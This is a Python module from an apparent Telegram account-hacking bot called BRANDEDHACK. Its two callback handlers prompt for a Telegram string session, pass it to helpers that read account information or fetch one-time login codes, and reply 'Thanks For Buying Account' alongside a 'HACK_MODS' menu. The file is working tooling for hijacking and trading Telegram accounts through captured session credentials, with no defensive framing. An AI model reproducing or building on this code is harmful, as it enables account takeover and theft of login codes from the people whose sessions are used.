import os
from BRANDEDHACK import app,API_ID,API_HASH
from pyrogram import filters , Client
from BRANDEDHACK.Helpers.steve import user_info, get_otp
from BRANDEDHACK.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"**Give Me Your String Session For Log in.**")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**Thanks For Buying Account**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"**Give Me Your String Session For Log in.**")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n**Thanks For Buying Account**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)
